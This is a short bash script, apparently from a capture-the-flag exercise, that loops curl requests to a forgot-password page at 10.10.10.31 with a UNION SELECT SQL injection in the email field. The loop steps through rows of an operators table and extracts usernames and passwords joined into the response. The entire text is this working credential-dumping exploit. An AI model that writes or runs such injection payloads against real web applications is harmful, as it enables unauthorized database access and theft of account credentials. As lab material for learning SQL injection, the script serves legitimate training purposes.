for i in $(seq 100 1000); do
	payload="email=asd@help.com' UNIoN SeLECT 1,2,3,CONCAT(__username_, ':', __password_, ':', 'asdv@help.com') FROM supercms.operators LIMIT 1 OFFSET $i-- -"
	#echo $payload
	curl -s -d "$payload" http://10.10.10.31/cmsdata/forgot.php | grep -o '[^ ]*@help.com'
done
